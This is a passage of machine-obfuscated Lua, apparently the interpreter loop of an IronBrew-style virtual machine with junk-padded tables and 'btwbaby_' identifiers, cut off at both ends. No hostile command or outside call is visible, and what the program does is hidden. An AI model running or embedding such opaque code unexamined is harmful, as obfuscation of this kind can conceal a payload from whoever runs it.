111";}]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("tXJ")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ON")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("vkk")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qa7W")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("rl")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xq1")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Y6")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hjC")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("e7ON")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("SS")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("MBd")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uW")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("eTQ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fg")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("5is")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7k")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("2dc")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("zM")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("n8T")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AS")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("C9g")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dorr")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PB")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5Ff")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("un")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("F7m")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("EtCg")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("O3")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Tih")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("cYEv")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("xS")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("kGZ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0v6T")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AI")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("hDb")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("04XE")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("l6")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1TI")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hp")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oBN")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Zo")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("AlT")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ta")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("upH")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1p")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("OTM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{782;708;288;75};}]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("6XS")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("aj")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("63p")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5GTL")]];else local btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ux")];local btwbaby_IIIllIlIIlI=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jii")]];btwbaby_llllIllI[btwbaby_llIIllIll+1]=btwbaby_IIIllIlIIlI;btwbaby_llllIllI[btwbaby_llIIllIll]=btwbaby_IIIllIlIIlI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cUd7")]];end;elseif btwbaby_IIlIllIIlIlIIlIIIl>#{{252;998;231;712};"1 + 1 = 111";"1 + 1 = 111";{492;921;997;898};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{776;667;983;315};{638;378;826;305};"1 + 1 = 111";"1 + 1 = 111";{977;584;750;257};{49;871;390;316};"1 + 1 = 111";"1 + 1 = 111";{922;58;85;876};{27;664;444;843};"1 + 1 = 111";"1 + 1 = 111";{475;938;18;703};"1 + 1 = 111";"1 + 1 = 111";{807;658;604;243};{324;657;574;343};"1 + 1 = 111";{624;496;816;471};"1 + 1 = 111";{697;626;303;241};{72;137;698;477};{843;964;136;180};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{866;110;198;701};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{808;740;316;136};"1 + 1 = 111";{815;690;36;936};}then local btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("aR")]btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IllIIIllIlIIIIIlIIIllII+1,btwbaby_lIlIIllIllIlIIlI))else for btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IllIIIllIlIIIIIlIIIllII[#("VS")],btwbaby_IllIIIllIlIIIIIlIIIllII[#("735")]do btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII]=nil;end;end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#{"1 + 1 = 111";{393;789;133;455};{970;764;266;114};{894;588;420;952};{356;234;632;497};{318;496;922;451};"1 + 1 = 111";{246;156;661;213};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{678;970;103;175};"1 + 1 = 111";"1 + 1 = 111";{885;60;797;211};{592;851;82;956};"1 + 1 = 111";{907;172;499;968};{586;514;81;37};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{306;913;572;727};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{429;2;775;870};"1 + 1 = 111";{788;224;267;138};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{156;700;32;381};"1 + 1 = 111";{469;459;495;604};"1 + 1 = 111";"1 + 1 = 111";{854;698;751;806};"1 + 1 = 111";"1 + 1 = 111";{385;967;185;825};{101;352;733;707};{662;182;193;82};{900;859;869;150};}then if btwbaby_IIlIllIIlIlIIlIIIl>#{"1 + 1 = 111";{356;408;533;361};"1 + 1 = 111";"1 + 1 = 111";{511;281;794;417};"1 + 1 = 111";{393;693;926;773};{238;473;696;9};{915;791;739;906};"1 + 1 = 111";"1 + 1 = 111";{183;942;788;293};"1 + 1 = 111";{792;159;718;789};"1 + 1 = 111";{10;255;73;732};{102;486;988;461};{761;341;803;173};"1 + 1 = 111";{645;890;353;367};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{289;732;972;739};"1 + 1 = 111";"1 + 1 = 111";{589;59;430;381};"1 + 1 = 111";{621;249;32;573};"1 + 1 = 111";{113;356;867;946};"1 + 1 = 111";{106;456;764;331};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{322;786;21;919};"1 + 1 = 111";{40;774;965;44};{527;5;808;99};{548;347;827;664};{799;696;941;136};{769;655;520;364};"1 + 1 = 111";"1 + 1 = 111";}then local btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("nI")]btwbaby_llllIllI[btwbaby_llIIllIll]=btwbaby_llllIllI[btwbaby_llIIllIll](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_llIIllIll+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("6vS")]))else btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("im")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{640;153;149;845};{901;558;394;529};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("cdyY")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("es")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zFY")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IZ")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8o7")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("DHMm")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("tb")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1dq")]][btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ta5m")]]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];if(btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2X")]]==btwbaby_IllIIIllIlIIIIIlIIIllII[#("jCXm")])then btwbaby_llIIllIll=btwbaby_llIIllIll+1;else btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{704;931;736;119};{304;790;794;112};{401;782;596;539};}];end;end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("0ceQ6iCpN6FhGCDxh0VnfXMcbYTF9MyD7ixYxcpJ9J4GcRP")then btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jd")]]=btwbaby_lllIllIIlIlIlIllIIIIIIIII[btwbaby_IllIIIllIlIIIIIlIIIllII[#("l59")]];elseif btwbaby_IIlIllIIlIlIIlIIIl==#("BENcv5ydBcPhz6qbJbjxfPafKlnG2g9timeG9uhbUtyuyhjc")then if(btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9A")]]==btwbaby_IllIIIllIlIIIIIlIIIllII[#("o4r1")])then btwbaby_llIIllIll=btwbaby_llIIllIll+1;else btwbaby_llIIllIll=btwbaby_IllIIIllIlIIIIIlIIIllII[#("dUP")];end;else local btwbaby_IIlIllIIlIlIIlIIIl;btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("R1")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("uvN")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("He3x")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2g")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("bIO")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fr99")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("od")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sku")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("XG9Z")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Df")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("fuU")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PNmo")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sS")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("kUh")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("M1l")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4KHh")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bD")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jx2")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sb")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("eXE")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qi")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZxK")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("pl")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("MPv")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Io")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Azx")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("L61o")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("pC")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Dvo")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("hWH2")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("gl")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("keg")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4s")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("MVZ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("yOoQ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("P0")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("kFS")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("UK")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("PoY")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("QRM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("s7")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Vgs")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("dy")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("yYE")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("mM")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("EuP")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Cb6X")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("P9")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("icn")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("15")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qlb")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("NC8J")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ud")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ro")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("7RN")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("LDj")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("IO")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("TFe")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("BG")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{{452;733;545;288};"1 + 1 = 111";{101;935;12;468};}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("YP")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rM8")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{398;590;462;873};{275;309;543;752};"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1o")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("0FG")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{221;345;90;405};"1 + 1 = 111";{174;865;796;514};"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ll")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("aZn")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jAUF")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{344;509;566;68};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("PJl")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("a9hR")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oo")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("OmI")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("bzHA")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4Y")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("krM")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("eA")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{59;896;241;159};"1 + 1 = 